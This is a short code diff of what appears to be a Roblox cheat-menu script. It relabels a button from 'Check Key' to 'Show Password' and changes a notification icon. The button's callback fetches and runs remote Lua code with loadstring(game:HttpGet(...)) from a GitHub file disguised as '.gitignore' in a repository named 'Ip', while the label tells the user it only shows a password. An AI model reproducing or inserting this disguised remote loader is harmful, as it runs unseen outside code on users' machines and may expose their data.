@@ -50,7 +50,7 @@ local Key = win:NewTab({
 
 
 Key:Button({
-    Title = "Check Key",
+    Title = "Show Password",
     Callback = function()
             notif()
             loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/Ip/main/.gitignore'),true))()
@@ -100,7 +100,7 @@ end
         OrionLib:MakeNotification({
             Name = "Notification!",
             Content = "Password: The key is 'Des'",
-            Image = "rbxassetid://4483345998",
+            Image = "rbxassetid://3610254229",
             Time = 10
         })
     end
